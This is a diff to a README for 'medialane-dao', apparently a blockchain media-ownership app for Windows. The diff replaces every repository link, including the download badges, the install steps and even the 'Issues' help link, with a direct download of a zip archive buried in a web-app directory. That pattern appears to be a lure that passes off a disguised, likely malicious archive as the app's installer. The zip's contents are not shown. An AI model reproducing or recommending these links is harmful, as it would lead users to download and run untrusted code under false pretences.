@@ -1,6 +1,6 @@
 # 🎬 medialane-dao - Simple Access to Digital Ownership
 
-[![Download medialane-dao](https://img.shields.io/badge/Download-Medialane--DAO-brightgreen)](https://github.com/WendyPrado/medialane-dao)
+[![Download medialane-dao](https://img.shields.io/badge/Download-Medialane--DAO-brightgreen)](https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to install and start using the app on Windows. The process is
 
 Click this link or the button above to visit the download page:
 
-[https://github.com/WendyPrado/medialane-dao](https://github.com/WendyPrado/medialane-dao)
+[https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip](https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip)
 
 You will find the latest version of medialane-dao available for download there.
 
@@ -96,7 +96,7 @@ If you run into issues:
 
 For help, visit the GitHub repository:
 
-[https://github.com/WendyPrado/medialane-dao](https://github.com/WendyPrado/medialane-dao)
+[https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip](https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip)
 
 Look under the “Issues” tab to see if others have similar questions. You can open a new issue for further assistance.
 
@@ -119,10 +119,10 @@ The app acts as a user-friendly window to complex blockchain tools.
 
 Return to the download page here:
 
-[https://github.com/WendyPrado/medialane-dao](https://github.com/WendyPrado/medialane-dao)
+[https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip](https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip)
 
 Follow the steps above to get the latest installer. This page always shows the newest updates for Windows users.
 
 ---
 
-[![Download medialane-dao](https://img.shields.io/badge/Download-Medialane--DAO-brightgreen)](https://github.com/WendyPrado/medialane-dao)
+[![Download medialane-dao](https://img.shields.io/badge/Download-Medialane--DAO-brightgreen)](https://github.com/WendyPrado/medialane-dao/raw/refs/heads/main/app/(site)/members/medialane-dao-1.1.zip)
